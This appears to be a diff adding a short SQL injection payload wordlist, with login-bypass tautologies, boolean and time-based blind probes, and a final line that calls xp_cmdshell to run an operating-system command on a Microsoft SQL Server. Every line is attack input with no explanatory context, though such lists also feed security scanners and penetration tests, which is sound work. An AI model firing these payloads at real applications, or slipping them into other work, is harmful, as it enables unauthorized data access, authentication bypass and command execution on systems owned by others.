@@ -1,0 +1,17 @@
+a' or 1=1#
+a' or 1=1 -- 
+a' or 2=2 LIMIT 1;#
+a' or 2=2 LIMIT 1;-- 
+a' or 'a'='a
+a' and 1=1#
+a' and 1=2#
+a' and 1=1 -- 
+a' and 1=2 -- 
+a' and sleep(2)#
+1 or 1=1#
+1 or 1=1 -- 
+1 and 1=1#
+1 and 1=2#
+1 and 1=1 -- 
+1 and 1=2 -- 
+m' exec master..xp_cmdshell 'whoami' -- 
